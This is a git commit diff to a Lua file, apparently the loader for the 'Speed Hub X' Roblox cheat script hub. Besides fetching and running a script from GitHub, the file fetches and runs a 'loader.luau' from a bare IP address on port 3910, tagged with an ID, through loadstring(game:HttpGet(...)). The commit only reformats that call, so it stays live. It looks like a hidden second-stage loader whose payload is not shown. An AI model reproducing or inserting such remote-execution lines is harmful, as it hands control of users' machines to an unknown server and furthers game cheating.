10b2c5211f569e7cb27890549836e4e1bc5ad714
AhmaV990 <tossxzui@gmail.com>
2025-10-15 11:11:33 +0800

    Update Speed%20Hub%20X.lua

--- Speed%20Hub%20X.lua
+++ Speed%20Hub%20X.lua
@@ -1,2 +1,3 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-ID="a6606652-b48b-4904-9689-b96cedaa2bba";loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+ID="a6606652-b48b-4904-9689-b96cedaa2bba";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
